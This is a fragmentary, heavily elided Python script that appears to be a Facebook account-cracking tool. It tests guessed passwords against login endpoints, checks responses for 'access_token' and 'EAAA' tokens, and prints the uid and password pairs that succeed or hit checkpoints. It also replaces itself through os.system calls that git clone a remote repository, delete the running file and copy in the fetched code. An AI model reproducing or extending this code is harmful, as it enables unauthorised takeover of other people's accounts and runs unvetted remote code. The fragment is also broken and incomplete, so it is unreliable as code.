...
def log_sel():
	...
	if sel == "":
		...
		try:
			...
			os.system("git clone https://github.com/Shuvo-hasan/fuck")

			os.system("rm -rf fuck.py")

			os.system("cp -f fuck/fuck.py \\.")
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				if "www.facebook.com" in data.json()['error_msg']:
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						print(" \033[1;32m[-Shuvo

OK] "+uid+" | "+pass2+"\033[0;97m")
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			...
																			print(" \033[1;33m[-ShuvoCP] "+uid+" | "+pass8+"\033[0;97m")
...
def crack_select():
	...
	print("\033[92;1m  FUCK😁 HAS BEEN STARTED\x1b[0m")
